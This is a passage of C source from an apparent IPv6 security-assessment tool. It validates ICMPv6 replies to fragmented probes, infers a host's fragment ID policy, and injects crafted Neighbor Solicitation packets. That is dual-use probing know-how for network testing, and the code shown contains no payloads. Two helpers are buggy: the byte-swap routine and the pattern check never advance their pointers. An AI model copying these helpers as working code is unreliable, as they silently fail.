				if( *(u_int32_t *) pkt_ptr != (*(u_int32_t *) (pkt_ptr+sizeof(u_int32_t)) ^ 0xabcdabcd)){
					return 0;
				}
			}

			break;

		case ICMP6_TIME_EXCEEDED:
			/*
			   Discard the packet if it is not of the minimum size to contain an ICMPv6 
			   header and the payload we included in the ICMPv6 Echo Request
			 */
			minfragsize= sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr)+sizeof(struct ip6_hdr) + \
							sizeof(struct ip6_frag) + sizeof(struct icmp6_hdr) + (fsize_f?fsize:MIN_FRAG_SIZE) + \
							(tstamp_f?(sizeof(time_t)+sizeof(u_int32_t)):0);

			if( ((pkt_end - (unsigned char *) pkt_ipv6) < minfragsize) &&  \
										(pkt_end - (unsigned char *) pkt_ipv6) < MIN_IPV6_MTU){
				return 0;
			}

			pkt_ipv6_ipv6= (struct ip6_hdr *) ((unsigned char *)pkt_icmp6+ sizeof(struct icmp6_hdr));
			pkt_fh_fh= NULL;
			pkt_ext= (struct ip6_ext *) ((unsigned char *)pkt_ipv6_ipv6 + sizeof(struct ip6_hdr));
			pkt_prev_nh= (pkt_ipv6_ipv6->ip6_nxt);

			while(pkt_prev_nh != IPPROTO_ICMPV6 && \
				( (unsigned char *)pkt_ext + (pkt_ext->ip6e_len * 8 + 1)) < pkt_end){

				if(pkt_prev_nh == IPPROTO_FRAGMENT)
					pkt_fh_fh= (struct ip6_frag *) pkt_ext;

				pkt_prev_nh= pkt_ext->ip6e_nxt;
				pkt_ext= (struct ip6_ext *) ( (unsigned char *)pkt_ext + ((pkt_ext->ip6e_len + 1) * 8));
			}

			if(pkt_prev_nh == IPPROTO_ICMPV6){
				pkt_icmp6_icmp6= (struct icmp6_hdr *) pkt_ext;

				if( ((unsigned char *) pkt_icmp6_icmp6 + (sizeof(struct icmp6_hdr)+ sizeof(struct ip6_hdr)+ \
						sizeof(struct ip6_frag)+sizeof(struct icmp6_hdr))) > pkt_end){
					return 0;
				}
			}
			else{
				return 0;
			}

			if(pkt_fh_fh == NULL)
				return 0;

			/*
			 * We can only check the embedded ICMPv6 header if the embedded fragment is the first fragment of
			 * a packet
			 */
			if(ntohs(pkt_fh_fh->ip6f_offlg & IP6F_OFF_MASK) == 0){ 
				if(pkt_icmp6_icmp6->icmp6_type != ICMP6_ECHO_REQUEST){
					return 0;
				}

				if(pkt_icmp6_icmp6->icmp6_data16[0] != htons(getpid())){
					return 0;
				}

				if(tstamp_f){
					pkt_ptr= ((unsigned char *) pkt_icmp6_icmp6+ sizeof(struct icmp6_hdr));
					if( *(u_int32_t *) pkt_ptr != (*(u_int32_t *) (pkt_ptr+sizeof(u_int32_t)) ^ 0xabcdabcd)){
						return 0;
					}
				}
			}
			else{
				return 0;
			}

			break;

		default:
			return 0;
			break;
	}

	/*
	   Check that the Source Address of the Packet is "valid"
	 */
	if(IN6_IS_ADDR_UNSPECIFIED(&(pkt_ipv6->ip6_src))){
		return 0;
	}

	if(IN6_IS_ADDR_LOOPBACK(&(pkt_ipv6->ip6_src))){
		return 0;
	}

	if(IN6_IS_ADDR_MULTICAST(&(pkt_ipv6->ip6_src))){
		return 0;
	}

	/* 
	   Check that that the Destination Address of the incoming packet is one
	   of our addresses.
	 */
	if(!(floodf_f && srcprefix_f) && !is_eq_in6_addr(&srcaddr, &(pkt_ipv6->ip6_dst))){
		return 0;
	}

	return 1;
}



/*
 * Function: valid_icmp6_response2()
 *
 * Checks whether the response to an ICMPv6 probe (for identifying the fragment reassembly policy) is valid
 */

int valid_icmp6_response2(struct iface_data *idata, struct pcap_pkthdr *pkthdr, const u_char *pktdata, unsigned int minsize){

	struct ether_header	*pkt_ether;
	struct ip6_hdr		*pkt_ipv6, *pkt_ipv6_ipv6;
	struct ip6_ext		*pkt_ext;
	struct icmp6_hdr	*pkt_icmp6, *pkt_icmp6_icmp6;
	struct ip6_frag		*pkt_fh_fh;
	unsigned char		*pkt_end;
	u_int8_t			pkt_prev_nh;

	pkt_ether = (struct ether_header *) pktdata;
	pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + linkhsize);
	pkt_icmp6 = (struct icmp6_hdr *) ((char *) pkt_ipv6 + MIN_IPV6_HLEN);


	pkt_end = (unsigned char *) pktdata + pkthdr->caplen;

	/* The packet length is the minimum of what we capured, and what is specified in the
	   IPv6 Total Lenght field
	 */
	if( pkt_end > ((unsigned char *)pkt_icmp6 + pkt_ipv6->ip6_plen) )
		pkt_end = (unsigned char *)pkt_icmp6 + pkt_ipv6->ip6_plen;

	switch(pkt_icmp6->icmp6_type){
		case ICMP6_ECHO_REPLY:
			/*
			   Discard the packet if it is not of the minimum size to contain an ICMPv6 
			   header and the payload we included in the ICMPv6 Echo Request
			 */
			if( (pkt_end - (unsigned char *) pkt_ipv6) < minsize &&  (pkt_end - (unsigned char *) pkt_ipv6) < MIN_IPV6_MTU){
				return 0;
			}

			/* Check that the ICMPv6 checksum is correct */
			if(in_chksum(pkt_ipv6, pkt_icmp6, pkt_end-((unsigned char *)pkt_icmp6), IPPROTO_ICMPV6) != 0){
				return 0;
			}

			if(pkt_icmp6->icmp6_data16[0] != htons(getpid())){
				return 0;
			}

			break;

		case ICMP6_TIME_EXCEEDED:
			/*
			   Discard the packet if it is not of the minimum size to contain an ICMPv6 
			   header and the payload we included in the ICMPv6 Echo Request
			 */
			if( (pkt_end - (unsigned char *) pkt_ipv6) < minsize \
					&&  (pkt_end - (unsigned char *) pkt_ipv6) < MIN_IPV6_MTU){
				return 0;
			}

			pkt_ipv6_ipv6= (struct ip6_hdr *) ((unsigned char *)pkt_icmp6+ sizeof(struct icmp6_hdr));
			pkt_fh_fh= NULL;
			pkt_ext= (struct ip6_ext *) ((unsigned char *)pkt_ipv6_ipv6 + sizeof(struct ip6_hdr));
			pkt_prev_nh= (pkt_ipv6_ipv6->ip6_nxt);

			while(pkt_prev_nh != IPPROTO_ICMPV6 && \
				( (unsigned char *)pkt_ext + (pkt_ext->ip6e_len * 8 + 1)) < pkt_end){

				if(pkt_prev_nh == IPPROTO_FRAGMENT)
					pkt_fh_fh= (struct ip6_frag *) pkt_ext;

				pkt_prev_nh= pkt_ext->ip6e_nxt;
				pkt_ext= (struct ip6_ext *) ( (unsigned char *)pkt_ext + ((pkt_ext->ip6e_len + 1) * 8));
			}

			if(pkt_prev_nh == IPPROTO_ICMPV6){
				pkt_icmp6_icmp6= (struct icmp6_hdr *) pkt_ext;

				if( ((unsigned char *) pkt_icmp6_icmp6 + (sizeof(struct icmp6_hdr)+ sizeof(struct ip6_hdr)+ \
						sizeof(struct ip6_frag)+sizeof(struct icmp6_hdr))) > pkt_end){
					return 0;
				}
			}
			else{
				return 0;
			}

			if(pkt_fh_fh == NULL){
				return 0;
			}

			/*
			 * We can only check the embedded ICMPv6 header if the embedded fragment is the first fragment of
			 * a packet
			 */
			if(ntohs(pkt_fh_fh->ip6f_offlg & IP6F_OFF_MASK) == 0){ 
				if(pkt_icmp6_icmp6->icmp6_type != ICMP6_ECHO_REQUEST){
					return 0;
				}

				if(pkt_icmp6_icmp6->icmp6_data16[0] != htons(getpid())){
					return 0;
				}

			}
			else{
				return 0;
			}

			break;

		default:
			return 0;
			break;
	}

	/*
	   Check that the Source Address of the Packet is "valid"
	 */
	if(IN6_IS_ADDR_UNSPECIFIED(&(pkt_ipv6->ip6_src))){
		return 0;
	}

	if(IN6_IS_ADDR_LOOPBACK(&(pkt_ipv6->ip6_src))){
		return 0;
	}

	if(IN6_IS_ADDR_MULTICAST(&(pkt_ipv6->ip6_src))){
		return 0;
	}

	/* 
	   Check that that the Destination Address of the incoming packet is one
	   of our addresses.
	 */
	if(!(floodf_f && srcprefix_f) && !is_eq_in6_addr(&srcaddr, &(pkt_ipv6->ip6_dst))){
		return 0;
	}

	return 1;
}


/*
 * Function: test_frag_pattern()
 *
 * Check whether a specific pattern is present in a portion of an IPv6 fragment
 */
int test_frag_pattern(unsigned char *ptr, unsigned int size, char *block){
	unsigned int i;

	for(i=0; i<size/FRAG_BLOCK_SIZE; i++){
		if(memcmp(ptr, block, FRAG_BLOCK_SIZE) != 0)
			return(0);
	}

	return(1);
}




/*
 * Function: predict_frag_id()
 *
 * Identifies and prints the Fragment Identification generation policy
*/
int predict_frag_id(u_int32_t *s1, unsigned int n1, u_int32_t *s2, unsigned int n2){
	u_int32_t		diff1_avg, diff2_avg;
	double			diff1_sdev, diff2_sdev;

	if(inc_sdev(s1, n1, &diff1_avg, &diff1_sdev) == -1){
		if(verbose_f)
			puts("Error while allocating memory in inc_sdev()");

		return(-1);
	}

	if(inc_sdev(s2, n2, &diff2_avg, &diff2_sdev) == -1){
		if(verbose_f)
			puts("Error while allocating memory in inc_sdev()");

		return(-1);
	}
	

	if(diff1_sdev <= 10){
		if(diff2_sdev <= 10){
			printf("Fragment ID policy: Global IDs with increments of %u (sdev: %f)\n", diff1_avg, diff1_sdev);
		}
		else{
			printf("Fragment ID policy: Per-destination IDs with increments of %u (sdev: %f)\n", diff1_avg, diff1_sdev);
		}
	}
	else{
		printf("Fragment ID policy: Randomized IDs (Avg. inc.: %u, sdev: %f)\n", diff1_avg, diff1_sdev);
	}

	return(0);
}



/*
 * Function: inc_sdev()
 *
 * Computes the average increment and standard deviation of an array of u_int32_t's.
 * The function computes the aforementioned values for network byte order and host byte order,
 * and returns as a result the set of values with smaller standard deviation.
*/
int inc_sdev(u_int32_t *s, unsigned int n, u_int32_t *diff_avg, double *diff_sdev){
	unsigned int			i;
	u_int32_t				*diff, *s2;
	unsigned long long int	diff1_avg, diff2_avg;
	double					diff1_sdev, diff2_sdev;

	if( (diff=malloc((n-1)*sizeof(u_int32_t))) == NULL)
		return(-1);

	diff1_avg= 0;

	for(i=0; i<(n-1); i++){
		diff[i]= s[i+1]-s[i];
		diff1_avg+= diff[i];
	}

	diff1_avg= diff1_avg/(n-1);

	diff1_sdev= 0;

	for(i=0; i<(n-1); i++)
		diff1_sdev= diff1_sdev + (diff[i] - diff1_avg) * (diff[i] - diff1_avg);

	diff1_sdev= sqrt(diff1_sdev/(n-2));

	if( (s2=malloc(n * sizeof(u_int32_t))) == NULL)
		return(-1);

	memcpy(s2, s, n* sizeof(u_int32_t));
	change_endianness(s2, n);

	diff2_avg= 0;

	for(i=0; i<(n-1); i++){
		diff[i]= s2[i+1]-s2[i];
		diff2_avg+= diff[i];
	}

	diff2_avg= diff2_avg/(n-1);

	diff2_sdev= 0;

	for(i=0; i<(n-1); i++)
		diff2_sdev= diff2_sdev + (diff[i] - diff2_avg) * (diff[i] - diff2_avg);

	diff2_sdev= sqrt(diff2_sdev/(n-2));

	free(diff);
	free(s2);

	if(diff1_sdev <= diff2_sdev){
		*diff_avg= diff1_avg;
		*diff_sdev= diff1_sdev;
	}
	else{
		*diff_avg= diff2_avg;
		*diff_sdev= diff2_sdev;
	}

	return(0);
}


/*
 * Function: change_endianness()
 *
 * Changes the endianness of an array of u_int32_t's
*/
void change_endianness(u_int32_t *s, unsigned int n){
	unsigned int		i;
	union {
		u_int32_t		ui;
		unsigned char	c[4];
	} swapper;

	unsigned char	c;

	for(i=0; i<n; i++){
		swapper.ui= *s;
		c= swapper.c[3];
		swapper.c[3]= swapper.c[0];
		swapper.c[0]= c;

		c= swapper.c[2];
		swapper.c[2]= swapper.c[1];
		swapper.c[1]= c;
	}
}		



int send_neighbor_solicit(struct iface_data *idata){
	unsigned char	*ptr;
	unsigned char			buffer[65556];
	unsigned int 			ns_max_packet_size;
	struct ether_header		*ether;
	unsigned char 			*v6buffer;
	struct ip6_hdr			*ipv6;
	struct nd_neighbor_solicit	*ns;
	struct nd_opt_slla		*sllaopt;

	ns_max_packet_size = idata->mtu;

	ether = (struct ether_header *) buffer;
	v6buffer = buffer + sizeof(struct ether_header);
	ipv6 = (struct ip6_hdr *) v6buffer;

	ether->src = hsrcaddr;
	ether->dst = ether_multicast(&dstaddr);
	ether->ether_type = htons(0x86dd);

	ipv6->ip6_flow=0;
	ipv6->ip6_vfc= 0x60;
	ipv6->ip6_hlim= 255;
	ipv6->ip6_src= srcaddr;
	ipv6->ip6_dst= solicited_node(&dstaddr);

	prev_nh = (unsigned char *) &(ipv6->ip6_nxt);
	*prev_nh = IPPROTO_ICMPV6;

	ptr = (unsigned char *) v6buffer + MIN_IPV6_HLEN;

	if( (ptr+sizeof(struct nd_neighbor_solicit)) > (v6buffer+ns_max_packet_size)){
		if(verbose_f>1)
			puts("Packet too large while inserting Neighbor Solicitation header");

		return(-1);
	}

	ns= (struct nd_neighbor_solicit *) (ptr);

	ns->nd_ns_type = ND_NEIGHBOR_SOLICIT;
	ns->nd_ns_code = 0;
	ns->nd_ns_reserved = 0;
	ns->nd_ns_target = dstaddr;

	ptr += sizeof(struct nd_neighbor_solicit);
	sllaopt = (struct nd_opt_slla *) ptr;    

	if( (ptr+sizeof(struct nd_opt_slla)) > (v6buffer+ns_max_packet_size)){
		if(verbose_f>1)
			puts("NS message too large while processing source link-layer addresss opt.");

		return(-1);
	}

	sllaopt->type= ND_OPT_SOURCE_LINKADDR;
	sllaopt->length= SLLA_OPT_LEN;
	bcopy( &(idata->ether.a), sllaopt->address, ETH_ALEN);
	ptr += sizeof(struct nd_opt_slla);

	ipv6->ip6_plen = htons((ptr - v6buffer) - MIN_IPV6_HLEN);
	ns->nd_ns_cksum = 0;
	ns->nd_ns_cksum = in_chksum(v6buffer, ns, ptr-((unsigned char *)ns), IPPROTO_ICMPV6);

	if((nw=pcap_inject(idata->pd, buffer, ptr - buffer)) == -1){
		if(verbose_f>1)
			printf("pcap_inject(): %s\n", pcap_geterr(idata->pd));

		return(-1);
	}

	if(nw != (ptr-buffer)){
		if(verbose_f>1)
			printf("pcap_inject(): only wrote %lu bytes (rather than %lu bytes)\n", (LUI) nw, \
											(LUI) (ptr-buffer));
		return(-1);
	}

	return 0;
}

